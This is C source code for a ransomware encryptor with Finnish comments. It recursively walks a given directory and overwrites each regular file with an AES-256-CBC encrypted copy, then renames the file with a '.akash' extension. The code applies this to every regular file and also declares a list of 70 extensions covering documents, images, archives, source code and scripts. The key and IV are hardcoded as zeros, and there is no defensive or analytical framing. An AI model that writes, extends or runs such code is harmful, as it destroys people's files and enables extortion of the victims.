#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include "aes.h"
#include <unistd.h>
#include <openssl/evp.h>

#define TARGET_EXTENSIONS_COUNT 70

const char* targetExtensions[TARGET_EXTENSIONS_COUNT] = {
    ".txt", ".vsxproj", ".vsxproj.user", ".vsxproj.filters", ".blend", ".tar", ".pro", ".ui", ".pfx",
    ".asp", ".inf", ".iso", ".h", ".url", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".pdf", ".jpg", ".png", ".bmp", ".gif", ".avi", ".mp4", ".mov", ".mp3", ".zip", ".rar",
    ".7z", ".cpp", ".c", ".py", ".java", ".sql", ".mdb", ".cs", ".html", ".csv",
    ".json", ".lnk", ".cmd", ".sln", ".log", ".data", ".xml", ".xaml", ".css", ".js", ".pyw", ".bat", ".dll",
    ".sdb", ".xsd", ".cat", ".msix", ".loc", ".tif", ".icn", ".aspx", ".config",
    ".reg", ".sh", ".vb", ".vbs", ".ps1", ".psm1",
};

//AES-256-CBC salaus
void encrypt_file(const char* filepath, const unsigned char* key, const unsigned char* iv) {
    FILE *fin = fopen(filepath, "rb");
    if (!fin) return;

    fseek(fin, 0, SEEK_END);
    long filesize = ftell(fin);
    fseek(fin, 0, SEEK_SET);

    unsigned char *plaintext = malloc(filesize);
    fread(plaintext, 1, filesize, fin);
    fclose(fin);

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    unsigned char ciphertext[filesize + EVP_MAX_BLOCK_LENGTH];
    int len, ciphertext_len = 0;

    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, filesize);
    ciphertext_len = len;
    EVP_EncryptFinal_ex(ctx, ciphertext + len, &len);
    ciphertext_len += len;
    EVP_CIPHER_CTX_free(ctx);

    fin = fopen(filepath, "wb");
    fwrite(ciphertext, 1, ciphertext_len, fin);
    fclose(fin);

    free(plaintext);

    char newname[4096];
    snprintf(newname, sizeof(newname), "%s.akash", filepath); //Tiedostopääte
    rename(filepath, newname);
}

//Vaihda tää drive skanneri
void scan_and_encrypt(const char* dirpath, const unsigned char* key, const unsigned char* iv) {
    DIR *d = opendir(dirpath);
    if (!d) return;
    struct dirent *entry;
    char path[4096];

    while ((entry = readdir(d)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        snprintf(path, sizeof(path), "%s/%s", dirpath, entry->d_name);

        struct stat st;
        stat(path, &st);
        if (S_ISDIR(st.st_mode)) {
            scan_and_encrypt(path, key, iv);
        } else if (S_ISREG(st.st_mode)) {
            if (!strstr(entry->d_name, ".akash")) {
                encrypt_file(path, key, iv);
            }
        }
    }
    closedir(d);
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("Usage: %s /path/to/scan\n", argv[0]);
        return 1;
    }
    unsigned char key[32] = {0}; // 256-bit key
    unsigned char iv[16] = {0};  // 128-bit IV

    scan_and_encrypt(argv[1], key, iv);
    return 0;
}